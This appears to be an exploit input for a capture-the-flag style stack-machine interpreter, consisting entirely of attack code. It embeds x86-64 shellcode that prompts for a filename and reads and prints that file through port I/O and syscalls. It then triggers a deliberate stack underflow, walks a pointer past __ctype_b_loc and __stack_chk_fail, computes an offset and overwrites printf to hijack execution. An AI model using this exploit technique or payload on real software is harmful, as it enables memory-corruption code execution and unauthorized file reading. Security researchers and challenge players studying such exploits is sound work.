
0 # padding
ASM
  mov edi, 1
  lea rsi, [rip + prompt]
  mov edx, promptend - prompt
  mov eax, 1
  syscall

  mov ecx, eax
  cmp ecx, 0
  jl exit


  mov dx, 0x8001 # read
  mov eax, 0x4010 # 0x4010 has 0, 0, size
  out dx, eax
  in eax, dx

  mov dx, 0x8000 # open
  mov eax, 0
  out dx, eax
  in eax, dx

  mov ecx, eax
  cmp ecx, 0
  jl exit

  
  mov edi, eax
  mov rsi, rsp
  mov edx, 0x100
  mov eax, 0
  syscall

  mov ecx, eax
  cmp ecx, 0
  jl exit
  
  mov edi, 1
  mov rsi, rsp
  mov edx, eax
  mov eax, 1
  syscall

  mov ecx, 0

exit:
  mov edi, ecx
  mov eax, 60
  syscall

prompt:
  .string "Please enter filename to open:"
promptend:
ENDASM  
pop

# Okay cause stack underflow
1
neg
swap # cause a stack underflow, and swap with stack ptr
pop
pop

# Store the pointer to stdin
#writed
#writed
0
store
1
store

# Note that stdin is now clobbered!
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
# Now our pointer is at __ctype_b_loc
pop
pop
pop
pop
pop
pop
pop
pop
# Pointer is at __stack_chk_fail with offset 0x7b6
2 # HI
store
3 # LO
store

# Calculate stack: LO + 0x2020a8 - 0x7b6
3
fetch
2103538
add
3
store

# Move pointer to printf
0
0
0
0
# Override printf
3
2
fetch
pop
fetch
writed

#writed
#writed
